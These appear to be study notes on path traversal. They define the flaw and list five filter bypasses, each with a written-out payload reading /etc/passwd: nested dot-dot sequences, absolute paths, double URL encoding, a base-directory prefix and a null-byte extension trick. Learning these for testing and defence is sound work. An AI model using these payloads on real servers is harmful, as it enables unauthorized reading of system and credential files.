<h2><u>Path Traversal</u></h2>

<h3>Introduction</h3>

Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on server that is running an application. This might include:

1. Application code and date
2. Credentials for back-end system.
3. sensitive operating system file

<h3>Vulnerability</h3>

This security vulnerability allow an attacker to 
read arbitrary files with in the web server operating system, attacker exploiting this vulnerability can gain unathorized access to this sensitive files.

<h3>comman defense against path traversal</h3>

1. most basic defence is deleting `../` but it can be by passed by inserting `../` with in `../` to make a payload like:
   `/image?filename=/..././..././..././etc/passwd`

2. another defence deletes the dot dot path, so it might get bypassed by simply puting absolute path `/image?filename=/etc/passwd`

3. by pass using encoding via url
   `/image?filename=%25%32%45%25%32%45%25%32%46%25%32%45%25%32%45%25%32%46%25%32%45%25%32%45%25%32%46etc/`

4. another bypass is to put base directory then traverse path:
   `/image?filename=/var/www/images/../../../etc/passwd`

5. An application may require the user-supplied filename to end with an expected file extension, such as `.png`. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension.
	`filename=../../../etc/passwd%00.png`
